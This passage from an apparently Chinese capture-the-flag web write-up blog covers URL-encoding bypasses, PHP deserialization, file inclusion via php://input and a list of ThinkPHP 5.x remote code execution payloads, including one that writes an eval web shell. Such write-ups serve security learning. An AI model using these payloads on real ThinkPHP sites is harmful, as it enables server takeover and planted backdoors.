文件类型</p>\n</blockquote>\n<p>这题 php 查看不了源码，只能用 phps 查看。</p>\n<p><img data-src=\"/img/webpic/image-20230824222125570.png\" alt=\"image-20230824222125570\"></p>\n<p>有点乱，用 burp 看一眼。</p>\n<p><img data-src=\"/img/webpic/image-20230824222253677.png\" alt=\"image-20230824222253677\"></p>\n<p>大概意思就是，GET 请求，如果 admin 等于传入的 id 在退出，但是下面可以通过 url 解码去绕过</p>\n<blockquote>\n<p>1, 只改变 a 即 %61dmin</p>\n<p>2, 全都改变 %61%64%6d%69%6e</p>\n</blockquote>\n<p>但是，进入网页可要 url 解码一次，所以 % 要改变 %25</p>\n<blockquote>\n<p>即最终的 payload 的为：?id=%2561%2564%256d%2569%256e</p>\n<p>​\t\t\t\t   \t\t\tor   ?id=%2561dmin</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824223440837.png\" alt=\"image-20230824223440837\"></p>\n<h2 id=\"ics-06\"><a class=\"markdownIt-Anchor\" href=\"#ics-06\">#</a> ics-06:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824223657576.png\" alt=\"image-20230824223657576\"></p>\n<p><img data-src=\"/img/webpic/image-20230824223722948.png\" alt=\"image-20230824223722948\"></p>\n<p>只有报表中心可以点</p>\n<p><img data-src=\"/img/webpic/image-20230824223808888.png\" alt=\"image-20230824223808888\"></p>\n<p>发现有 GET 传 id 的方式</p>\n<p>用 burp 抓下包看一下。（没有别的发现，只能对 id 爆破</p>\n<p><img data-src=\"/img/webpic/image-20230824224221045.png\" alt=\"image-20230824224221045\"></p>\n<p>这里添加 payload。</p>\n<p><img data-src=\"/img/webpic/image-20230824224258586.png\" alt=\"image-20230824224258586\"></p>\n<p>这样设置 payload，攻击！！</p>\n<p><img data-src=\"/img/webpic/image-20230824224459083.png\" alt=\"image-20230824224459083\"></p>\n<p>id=2333 异常。说明入侵者痕迹在这。</p>\n<p>查看响应包。</p>\n<p><img data-src=\"/img/webpic/image-20230824224825879.png\" alt=\"image-20230824224825879\"></p>\n<p>发现 flag</p>\n<h2 id=\"php_rce\"><a class=\"markdownIt-Anchor\" href=\"#php_rce\">#</a> php_rce:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824225156637.png\" alt=\"image-20230824225156637\"></p>\n<p>知识了解一下吧：</p>\n<blockquote>\n<p>1.ThinkPHP 简介：<br>\nThinkPHP 是一个开源，快速、简单的轻量级国产 PHP 开发框架，诞生于 2006 年初，原名 FCS，2007 年元旦正式更名为 ThinkPHP。使用面向对象的开发结构和 MVC 模式，融合了 Struts 的思想和 TagLib（标签库）、RoR 的 ORM 映射和 ActiveRecord 模式。</p>\n<p>ThinkPHP 可以支持 windows/Unix/Linux 等服务器环境，正式版需要 PHP 5.0 以上版本，支持 MySql、PgSQL、Sqlite 多种数据库以及 PDO 扩展，是一款跨平台，跨版本以及简单易用的 PHP 框架。</p>\n</blockquote>\n<p>其中 ThinkPHP 2 以及 ThinkPHP 3 系列已经停止维护，ThinkPHP 5 系列现使用最多，而 ThinkPHP 3 系列也积累了较多的历史用户。各个系列之间在代码实现及功能方面有较大区别。</p>\n<p>这是 PHP V5，找下 PHP V5 的漏洞。</p>\n<ul>\n<li>5.0.x：</li>\n</ul>\n<figure class=\"highlight web-idl\"><figcaption data-lang=\"web-idl\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>index/think\\config/get&amp;name<span class=\"token operator\">=</span>database<span class=\"token punctuation\">.</span>username <span class=\"token comment\">// 获取配置信息</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>index/\\think\\Lang/load&amp;file<span class=\"token operator\">=</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>/<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>/test<span class=\"token punctuation\">.</span>jpg <span class=\"token comment\">// 包含任意文件</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>index/\\think\\Config/load&amp;file<span class=\"token operator\">=</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>/<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>/t<span class=\"token punctuation\">.</span>php <span class=\"token comment\">// 包含任意.php 文件</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>index/\\think\\app/invokefunction&amp;function<span class=\"token operator\">=</span>call_user_func_array&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>system&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>id <span class=\"token comment\">// 执行命令</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>/Index/\\think\\app/invokefunction&amp;function<span class=\"token operator\">=</span>call_user_func_array&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>phpinfo&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">-1</span> <span class=\"token comment\">// 执行 phpinfo ();</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>/Index/\\think\\app/invokefunction&amp;function<span class=\"token operator\">=</span>call_user_func_array&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>file_put_contents&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>shell<span class=\"token punctuation\">.</span>php&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php @eval<span class=\"token punctuation\">(</span>$_POST<span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">?</span><span class=\"token operator\">></span>\t<span class=\"token comment\">// 写入 shell</span></pre></td></tr></table></figure><ul>\n<li>5.1.x：</li>\n</ul>\n<figure class=\"highlight web-idl\"><figcaption data-lang=\"web-idl\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>index/\\think\\Request/input&amp;filter<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>system&amp;data<span class=\"token operator\">=</span><span class=\"token class-name\">pwd</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">?</span></span>s<span class=\"token operator\">=</span>index/\\think\\view\\driver\\Php/display&amp;content<span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span><span class=\"token class-name\">php</span> phpinfo<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">?</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>index/\\think\\template\\driver\\file/write&amp;cacheFile<span class=\"token operator\">=</span>shell<span class=\"token punctuation\">.</span>php&amp;content<span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php @eval<span class=\"token punctuation\">(</span>$_POST<span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">?</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>index/\\think\\Container/invokefunction&amp;function<span class=\"token operator\">=</span>call_user_func_array&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>system&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token class-name\">id</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">?</span></span>s<span class=\"token operator\">=</span>index/\\think\\app/invokefunction&amp;function<span class=\"token operator\">=</span>call_user_func_array&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>system&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>id</pre></td></tr></table></figure><p>执行 5.0 的漏洞</p>\n<p><img data-src=\"/img/webpic/image-20230824225834486.png\" alt=\"image-20230824225834486\"></p>\n<p>发现当前目录没有 flag</p>\n<p><img data-src=\"/img/webpic/image-20230824230021454.png\" alt=\"image-20230824230021454\"></p>\n<p>根目录有 flag</p>\n<p><img data-src=\"/img/webpic/image-20230824230224897.png\" alt=\"image-20230824230224897\"></p>\n<p>得到 flag</p>\n<h2 id=\"unserialize3\"><a class=\"markdownIt-Anchor\" href=\"#unserialize3\">#</a> unserialize3:&gt;</h2>\n<p>反序列化：</p>\n<blockquote>\n<h3 id=\"什么是序列化serialize\"><a class=\"markdownIt-Anchor\" href=\"#什么是序列化serialize\">#</a> 什么是序列化 (serialize)</h3>\n<p>将对象的状态信息转换为可以存储或传输的形式的过程，简单来说，就是将状态信息保存为字符串</p>\n<h3 id=\"什么是反序列化unserialize\"><a class=\"markdownIt-Anchor\" href=\"#什么是反序列化unserialize\">#</a> 什么是反序列化 (unserialize)</h3>\n<p>将字符串转换为状态信息</p>\n<p>二、什么是反序列化漏洞</p>\n<p>当程序在进行反序列化时，会自动调用一些函数，例如_wakeup ()   _destruct () 等函数，但是如果传入函数的参数可以被用户控制的话，用户可以输入一些恶意代码到函数中，从而导致反序列化漏洞。</p>\n</blockquote>\n<p>由于反序列化时 unserialize () 函数会自动调用 wakeup (),destruct (), 函数，当有一些漏洞或者恶意代码在这些函数中，当我们控制序列化的字符串时会去触发他们，从而达到攻击。</p>\n<blockquote>\n<p>__construct () : 构造函数，当创建对象时自动调用。</p>\n<p>__destruct (): 析构函数，在对象的所有引用都被删除时或者对象被显式销毁时调用，当对象被销毁时自动调用。</p>\n<p>__wakeup (): 进行 unserialize 时会查看是否有该函数，有的话有限调用。会进行初始化对象。遇到 unserialize () 时自动触发</p>\n<p>__ toString (): 当一个类被当成字符串时会被调用。</p>\n<p>__sleep (): 当一个对象被序列化时调用，可与设定序列化时保存的属性。</p>\n</blockquote>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">xctf</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token variable\">$flag</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'111'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'bad requests'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">?</span>code<span class=\"token operator\">=</span></pre></td></tr></table></figure><p>这个题，需要去完善下代码。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">xctf</span><span class=\"token punctuation\">&#123;</span>                      <span class=\"token comment\">// 定义一个名为 xctf 的类</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token variable\">$flag</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'111'</span><span class=\"token punctuation\">;</span>            <span class=\"token comment\">// 定义一个公有的类属性 $flag，值为 111</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>      <span class=\"token comment\">// 定义一个公有的类方法__wakeup ()，输出 bad requests 后退出当前脚本</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'bad requests'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token variable\">$peak</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">xctf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>           <span class=\"token comment\">// 使用 new 运算符来实例化该类（xctf）的对象为 peak</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$peak</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>       <span class=\"token comment\">// 输出被序列化的对象（peak）</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>执行下</p>\n<p><img data-src=\"/img/webpic/image-20230824231257800.png\" alt=\"image-20230824231257800\"></p>\n<blockquote>\n<p s:4:flag;s:3:111;=\"\">O:4:“xctf”:1:</p>\n<p>O 代表 object（为 A 时代表 Array），4 代表 &quot;test&quot; 占 4 个字符长度，1 代表着对象具有一个变量：flag，s 代表 string，字符型（如果为 i，代表 int 型）</p>\n<p>里面的值是不可修改的，但是可以修改的属性 (变量) 数大于实际的个数时，就可以绕过 wakeup</p>\n</blockquote>\n<p>所以 payload 为</p>\n<blockquote s:4:flag;s:3:111;=\"\">\n<p>?code=O:4:“xctf”:2:</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824231621861.png\" alt=\"image-20230824231621861\"></p>\n<h2 id=\"web_php_include\"><a class=\"markdownIt-Anchor\" href=\"#web_php_include\">#</a> Web_php_include:&gt;</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 显示当前文件的源代码</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'hello'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">// 输出名为 'hello' 的 GET 参数的值</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$page</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'page'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">// 将名为 'page' 的 GET 参数的值赋给变量 $page</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strstr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"php://\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  <span class=\"token comment\">// 当 $page 中包含 \"php://\" 时执行循环</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token variable\">$page</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php://\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 将 $page 中的所有 \"php://\" 替换为空字符串</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 包含并执行 $page 对应的文件</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><blockquote>\n<p>由于这段代码对用户输入的  <code>$page</code>  参数直接进行了  <code>include</code> ，存在安全风险。未经验证的用户输入可能导致远程文件包含（RFI）攻击或代码注入漏洞。</p>\n</blockquote>\n<blockquote>\n<p>一、文件包含漏洞分类</p>\n<p>LFI(Local File Inclusion)<br>\n 本地文件包含漏洞，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是 LFI。<br>\n为了方便本文把 LFI 直接称为文件包含漏洞。</p>\n<p>RFI(Remote File Inclusion)<br>\n 远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。但 RFI 的利用条件较为苛刻，需要 php.ini 中进行配置</p>\n<pre><code>allow_url_fopen = On\nallow_url_include = On\n</code></pre>\n<p>两个配置选项均需要为 On，才能远程包含文件成功。<br>\n在 php.ini 中，allow_url_fopen 默认一直是 On，而 allow_url_include 从 php5.2 之后就默认为 Off。</p>\n</blockquote>\n<blockquote>\n<p>二、文件包含漏洞原理</p>\n<p>本地文件包含（Local File Inclusion）漏洞，是程序员在网站设计中，为方便自己在设计构架时，使用了一些包含的函数，在文件中包含一个文件。</p>\n<p>服务器执行 PHP 文件时，可以通过文件包含函数加载另一个文件中的 PHP 代码，并且当 PHP 来执行，这会为开发者节省大量的时间。</p>\n<p>这意味着可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，只更新一个包含文件就可以了，或者当向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。</p>\n<p>LFI 产生的原因是由于程序员未对用户可控变量进行输入检查，此漏洞的影响可能导致泄露服务器上的敏感文件等。<br>\n如若攻击者能够通过其他方式在 Web 服务器上放置代码，那么他们便可以执行任意命令</p>\n</blockquote>\n<blockquote>\n<p>三、文件包含函数</p>\n<p>PHP 中文件包含函数有以下四种：</p>\n<p>require () // 只在执行到此函数时才去包含文件，若包含的文件不存在产生警告，程序继续运行</p>\n<p>require_once () // 如果一个文件已经被包含过，则不会在包含它</p>\n<p>include () // 程序一运行文件便会包含进来，若包含文件不存在产生致命错误，程序终止运行</p>\n<p>include_once () // 如果一个文件已经被包含过，则不会在包含它</p>\n<p>include 和 require 区别主要是，include 在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；<br>\n而 require 函数出现错误的时候，会直接报错并退出程序的执行。</p>\n<p>而 include_once ()，require_once () 这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p>\n<p>这四个函数可以将任意类型的文件当做 PHP 文件进行解析。<br>\n示例代码：</p>\n   <?php\n       $filename  = $_GET['filename']; // 存在可控变量\n       include($filename); // 存在动态变量\n   ?>\n<p>例如：</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mrow></mrow><mi>G</mi></msub><mi>E</mi><mi>T</mi><mo stretchy=\"false\">[</mo><mtext>‘</mtext><mi>f</mi><mi>i</mi><mi>l</mi><mi>e</mi><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><mtext>’</mtext><mo stretchy=\"false\">]</mo><mtext>参数开发者没有经过严格的过滤，直接带入了</mtext><mi>i</mi><mi>n</mi><mi>c</mi><mi>l</mi><mi>u</mi><mi>d</mi><mi>e</mi><mtext>的函数，攻击者可以修改</mtext></mrow><annotation encoding=\"application/x-tex\">_GET[‘filename’]参数开发者没有经过严格的过滤，直接带入了include的函数，\n攻击者可以修改\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">G</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mopen\">[</span><span class=\"mord\">‘</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">e</span><span class=\"mord\">’</span><span class=\"mclose\">]</span><span class=\"mord cjk_fallback\">参</span><span class=\"mord cjk_fallback\">数</span><span class=\"mord cjk_fallback\">开</span><span class=\"mord cjk_fallback\">发</span><span class=\"mord cjk_fallback\">者</span><span class=\"mord cjk_fallback\">没</span><span class=\"mord cjk_fallback\">有</span><span class=\"mord cjk_fallback\">经</span><span class=\"mord cjk_fallback\">过</span><span class=\"mord cjk_fallback\">严</span><span class=\"mord cjk_fallback\">格</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">过</span><span class=\"mord cjk_fallback\">滤</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">直</span><span class=\"mord cjk_fallback\">接</span><span class=\"mord cjk_fallback\">带</span><span class=\"mord cjk_fallback\">入</span><span class=\"mord cjk_fallback\">了</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">e</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">函</span><span class=\"mord cjk_fallback\">数</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">攻</span><span class=\"mord cjk_fallback\">击</span><span class=\"mord cjk_fallback\">者</span><span class=\"mord cjk_fallback\">可</span><span class=\"mord cjk_fallback\">以</span><span class=\"mord cjk_fallback\">修</span><span class=\"mord cjk_fallback\">改</span></span></span></span>_GET [‘filename’] 的值，执行非预期的操作。</p>\n</blockquote>\n<ul>\n<li>【file:// 协议】</li>\n</ul>\n<blockquote>\n<p>file:// 协议在双 off 的情况下也可以正常使用；</p>\n<p>allow_url_fopen ：off/on</p>\n<p>allow_url_include：off/on</p>\n<p>file:// 用于访问本地文件系统，在 CTF 中通常用来读取本地文件的且不受 allow_url_fopen 与 allow_url_include 的影响。</p>\n<p>使用方法：</p>\n<p>file:// [文件的绝对路径和文件名]</p>\n</blockquote>\n<ul>\n<li>【php:// 协议】</li>\n</ul>\n<blockquote>\n<p>条件：</p>\n<p>不需要开启 allow_url_fopen，仅 php://input、 php://stdin、 php://memory 和 php://temp 需要开启 allow_url_include。</p>\n<p>php://filter 读取源代码并进行 base64 编码输出，不然会直接当做 php 代码执行就看不到源代码内容了。</p>\n<p>php://input 可以访问请求的原始数据的只读流，将 post 请求中的数据作为 PHP 代码执行。</p>\n</blockquote>\n<ul>\n<li>【data:// 协议】</li>\n</ul>\n<blockquote>\n<p>经过测试官方文档上存在一处问题，经过测试 PHP 版本 5.2，5.3，5.5，7.0；data:// 协议是是受限于 allow_url_fopen 的，官方文档上给出的是 NO，所以要使用 data:// 协议需要满足双 on 条件</p>\n<p>例子：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMS9jbWQucGhwP2ZpbGU9ZGF0YTovL3RleHQvcGxhaW4=\">http://127.0.0.1/cmd.php?file=data://text/plain</span>,<?php phpinfo()?></p>\n<p>or</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMS9jbWQucGhwP2ZpbGU9ZGF0YTovL3RleHQvcGxhaW47YmFzZTY0LFBEOXdhSEFnY0dod2FXNW1ieWdwUHo0PQ==\">http://127.0.0.1/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span></p>\n</blockquote>\n<p><img data-src=\"/img/webpic/713e77b23fb645afa92fb923eda7ac77.png\" alt=\"img\"></p>\n<ol>\n<li>方法一：</li>\n</ol>\n<p>php 协议：</p>\n<p><img data-src=\"/img/webpic/image-20230824233946558.png\" alt=\"image-20230824233946558\"></p>\n<p>只能用 burp 不能用 harkbar 有点奇怪</p>\n<p>请求包：</p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token request-line\"><span class=\"token method property\">GET</span> <span class=\"token request-target url\">/?page=PhP://input</span> <span class=\"token http-version property\">HTTP/1.1</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">61.147.171.105:64567</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Cache-Control</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">max-age=0</span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Upgrade-Insecure-Requests</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">1</span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">User-Agent</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.121 Safari/537.36</span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Accept</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Accept-Encoding</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">gzip, deflate</span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Accept-Language</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">zh-CN,zh;q=0.9</span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Connection</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">close</span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Content-Length</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">21</span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>&lt;?php system(\"ls\");?></pre></td></tr></table></figure><p>有 flag</p>\n<p><img data-src=\"/img/webpic/image-20230824234142386.png\" alt=\"image-20230824234142386\"></p>\n<p>得到 flag</p>\n<ol 